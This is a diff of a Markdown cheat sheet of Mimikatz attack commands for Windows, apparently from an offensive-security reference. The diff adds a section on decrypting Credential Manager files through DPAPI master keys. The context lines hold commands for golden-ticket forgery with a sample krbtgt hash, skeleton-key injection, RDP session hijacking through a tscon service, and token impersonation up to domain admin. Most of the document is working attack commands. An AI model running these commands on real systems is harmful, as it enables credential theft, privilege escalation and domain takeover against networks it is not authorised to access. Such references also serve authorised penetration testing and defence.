@@ -1,5 +1,18 @@
 # Windows - Mimikatz
 
+## Summary
+
+* [Mimikatz - Execute commands](#)
+* [Mimikatz - Extract passwords](#)
+* [Mimikatz - Mini Dump](#)
+* [Mimikatz - Golden ticket](#)
+* [Mimikatz - Skeleton key](#)
+* [Mimikatz - RDP session takeover](#)
+* [Mimikatz - Credential Manager & DPAPI](#)
+* [Mimikatz - Commands list](#)
+* [Mimikatz - Powershell version](#)
+* [References](#references)
+
 ![Data in memory](http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png)
 
 ## Mimikatz - Execute commands
@@ -64,7 +77,7 @@ Switch to minidump
 mimikatz # sekurlsa::logonPasswords
 ```
 
-## Mimikatz Golden ticket
+## Mimikatz - Golden ticket
 
 ```powershell
 .\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
@@ -74,7 +87,7 @@ mimikatz # sekurlsa::logonPasswords
 .\mimikatz "kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
 ```
 
-## Mimikatz Skeleton key
+## Mimikatz - Skeleton key
 
 ```powershell
 privilege::debug
@@ -85,7 +98,7 @@ net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
 rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
 ```
 
-## Mimikatz RDP session takeover
+## Mimikatz - RDP session takeover
 
 Run tscon.exe as the SYSTEM user, you can connect to any session without a password.
 
@@ -102,7 +115,24 @@ create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
 net start sesshijack
 ```
 
-## Mimikatz commands
+
+## Mimikatz - Credential Manager & DPAPI
+
+```powershell
+# check the folder to find credentials
+dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\*
+
+# check the file with mimikatz
+$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
+
+# find master key
+$ mimikatz !sekurlsa::dpapi
+
+# use master key
+$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
+```
+
+## Mimikatz - Commands list
 
 | Command |Definition|
 |:----------------:|:---------------|
@@ -129,7 +159,7 @@ net start sesshijack
 |TOKEN::Elevate | impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box|
 |TOKEN::Elevate /domainadmin | impersonate a token with Domain Admin credentials.
 
-## Powershell Mimikatz
+## Mimikatz - Powershell version
 
 Mimikatz in memory (no binary on disk) with :
 
